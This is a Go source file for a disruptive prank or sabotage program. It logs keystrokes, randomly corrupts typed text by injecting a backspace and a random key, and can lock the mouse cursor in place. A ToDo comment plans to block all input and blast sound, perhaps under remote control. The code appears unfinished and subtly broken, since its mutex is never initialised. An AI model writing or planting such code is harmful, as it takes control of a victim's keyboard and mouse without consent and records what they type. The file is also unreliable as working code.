package main

import (
	"crypto/rand"
	"fmt"
	"log"
	"math/big"
	"strings"
	"sync"
	"time"

	"github.com/kindlyfire/go-keylogger"
	"github.com/micmonay/keybd_event"
	"github.com/go-vgo/robotgo"
)


/*
	ToDo:
	Move mouse cursor
	Block mouse cursor
	Block keyboard input
	Max volume with random sound/preprogrammed sound (maybe remotely controlled)
*/


const (
	delayKeyfetchMS = 5
	keyReplaceCount = 5
	keyReplaceChangeDelayS = 10
)

var keysToReplace []string
var keysToReplacePTR *[]string = &keysToReplace
var mut *sync.Mutex

func main() {
	go changeKeysToReplace()
	replaceKeyboard()
}

func blockMouseCursor() {
	robotgo.MouseSleep = 20
	oldX, oldY := robotgo.GetMousePos()

	for {
		newX, newY := robotgo.GetMousePos()
		if newX != oldX || newY != oldY {
			robotgo.Move(oldX, oldY)
		}
	}
}

func replaceKeyboard() {
	kl := keylogger.NewKeylogger()
	keyruneString := ""
	kb, err := keybd_event.NewKeyBonding()
	if err != nil {
		log.Fatal(err)
	}

	for {
		key := kl.GetKey()

		if ! key.Empty {
			keyruneString = fmt.Sprintf("%c", key.Rune)
			fmt.Printf(keyruneString)

			mut.Lock()
			if sliceStringContains(keyruneString, *keysToReplacePTR) {
				kb.SetKeys(keybd_event.VK_BACKSPACE, randomKeyReplace())
				err = kb.Launching()
				if err != nil {
					log.Fatal(err)
				}
			}
			mut.Unlock()
		}

		time.Sleep(delayKeyfetchMS * time.Millisecond)
	}
}

func changeKeysToReplace() {
	pKeys := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789?![]{}-_.:,;()/|&%*#+"
	pKeySlice := strings.Split(pKeys, "")

	for {
		var keys []string

		for i := 0; i <= keyReplaceCount; i++ {
			nBig, err := rand.Int(rand.Reader, big.NewInt(int64(len(pKeySlice) -1)))
			if err != nil {
				panic(err)
			}
			keys = append(keys, pKeySlice[nBig.Int64()])
		}

		mut.Lock()
		keysToReplacePTR = &keys
		mut.Unlock()

		time.Sleep(keyReplaceChangeDelayS * time.Second)
	}
}

func sliceStringContains(value string, slice []string) (bool) {
	for _, v := range slice {
		if v == value {
			return true
		}
	}
	return false
}

func randomKeyReplace() (keyBoardEvent int) {
	pKeys := [41]int{keybd_event.VK_A, keybd_event.VK_B, keybd_event.VK_C, keybd_event.VK_D, keybd_event.VK_E, keybd_event.VK_F, keybd_event.VK_G,
	keybd_event.VK_H, keybd_event.VK_I, keybd_event.VK_J, keybd_event.VK_K, keybd_event.VK_L, keybd_event.VK_M, keybd_event.VK_N, keybd_event.VK_O,
	keybd_event.VK_P, keybd_event.VK_Q, keybd_event.VK_R, keybd_event.VK_S, keybd_event.VK_T, keybd_event.VK_U, keybd_event.VK_V, keybd_event.VK_W,
	keybd_event.VK_X, keybd_event.VK_Y, keybd_event.VK_Z, keybd_event.VK_BACKSLASH, keybd_event.VK_RIGHTBRACE, keybd_event.VK_LEFTBRACE, keybd_event.VK_ENTER,
	keybd_event.VK_ESC, keybd_event.VK_0, keybd_event.VK_1, keybd_event.VK_2, keybd_event.VK_3, keybd_event.VK_4, keybd_event.VK_5, keybd_event.VK_6,
	keybd_event.VK_7, keybd_event.VK_8, keybd_event.VK_9}

	nBig, err := rand.Int(rand.Reader, big.NewInt(int64(len(pKeys) -1)))
	if err != nil {
		panic(err)
	}
	keyBoardEvent = pKeys[nBig.Int64()]
	return
}